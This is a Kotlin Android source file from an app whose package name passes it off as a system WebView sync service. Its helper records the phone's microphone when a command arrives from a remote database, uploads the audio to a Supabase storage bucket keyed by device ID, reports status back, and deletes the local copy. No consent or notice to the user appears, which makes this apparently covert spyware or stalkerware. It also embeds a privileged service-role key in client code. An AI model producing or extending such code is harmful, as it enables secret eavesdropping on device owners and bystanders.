package com.system.webview.sync.services

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import com.system.webview.sync.network.SupabaseConfig
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

object MicrophoneCaptureHelper {
    private const val TAG = "MicrophoneCaptureHelper"
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    /**
     * Records [durationSeconds] of audio from the microphone, uploads it to
     * Supabase Storage (audio-recordings bucket), then updates the
     * microphone_commands row with status=EXECUTED and storage_path.
     *
     * @return true on full success
     */
    fun executeRecording(context: Context, commandId: Long, durationSeconds: Int, deviceUuid: String): Boolean {
        val outFile = File(context.cacheDir, "mic_${commandId}_${System.currentTimeMillis()}.m4a")
        var recorder: MediaRecorder? = null
        return try {
            // 1. Record
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128_000)
                setOutputFile(outFile.absolutePath)
                prepare()
                start()
            }

            Log.d(TAG, "Recording started — ${durationSeconds}s — cmd=$commandId")
            Thread.sleep(durationSeconds * 1000L)

            recorder.stop()
            recorder.release()
            recorder = null
            Log.d(TAG, "Recording finished: ${outFile.length()} bytes")

            if (!outFile.exists() || outFile.length() == 0L) {
                updateCommandFailed(commandId, "Output file kosong setelah rekaman")
                return false
            }

            // 2. Upload to Supabase Storage
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val storagePath = "$deviceUuid/rec_${timestamp}_${commandId}.m4a"
            val uploaded = uploadToStorage(outFile, storagePath)
            if (!uploaded) {
                updateCommandFailed(commandId, "Gagal upload ke storage")
                return false
            }

            // 3. Update command row → EXECUTED
            updateCommandExecuted(commandId, storagePath, outFile.length())
            true
        } catch (e: Exception) {
            Log.e(TAG, "Recording failed for cmd=$commandId", e)
            updateCommandFailed(commandId, e.message ?: "Error tidak diketahui")
            false
        } finally {
            try { recorder?.release() } catch (_: Exception) {}
            try { outFile.delete() } catch (_: Exception) {}
        }
    }

    private fun uploadToStorage(file: File, storagePath: String): Boolean {
        return try {
            val url = "${SupabaseConfig.URL}/storage/v1/object/audio-recordings/$storagePath"
            val body = file.asRequestBody("audio/mp4".toMediaType())
            val request = Request.Builder()
                .url(url)
                .put(body)
                .addHeader("apikey", SupabaseConfig.SERVICE_ROLE_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.SERVICE_ROLE_KEY}")
                .addHeader("Content-Type", "audio/mp4")
                .addHeader("x-upsert", "true")
                .build()
            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(TAG, "Upload SUCCESS: $storagePath")
                    true
                } else {
                    Log.e(TAG, "Upload FAILED ${response.code}: ${response.body?.string()}")
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Upload exception", e)
            false
        }
    }

    private fun updateCommandExecuted(commandId: Long, storagePath: String, fileSize: Long) {
        try {
            val url = "${SupabaseConfig.URL}/rest/v1/microphone_commands?id=eq.$commandId"
            val body = JSONObject().apply {
                put("status", "EXECUTED")
                put("storage_path", storagePath)
                put("file_size_bytes", fileSize)
                put("executed_at", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
                    .apply { timeZone = java.util.TimeZone.getTimeZone("UTC") }
                    .format(Date()))
            }.toString()
            val request = Request.Builder()
                .url(url)
                .patch(body.toRequestBody("application/json".toMediaType()))
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .addHeader("Prefer", "return=minimal")
                .build()
            httpClient.newCall(request).execute().use { Log.d(TAG, "Command $commandId marked EXECUTED") }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to mark command EXECUTED", e)
        }
    }

    private fun updateCommandFailed(commandId: Long, errorMsg: String) {
        try {
            val url = "${SupabaseConfig.URL}/rest/v1/microphone_commands?id=eq.$commandId"
            val body = JSONObject().apply {
                put("status", "FAILED")
                put("error_message", errorMsg.take(500))
                put("executed_at", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
                    .apply { timeZone = java.util.TimeZone.getTimeZone("UTC") }
                    .format(Date()))
            }.toString()
            val request = Request.Builder()
                .url(url)
                .patch(body.toRequestBody("application/json".toMediaType()))
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .addHeader("Prefer", "return=minimal")
                .build()
            httpClient.newCall(request).execute().use { Log.d(TAG, "Command $commandId marked FAILED: $errorMsg") }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to mark command FAILED", e)
        }
    }
}
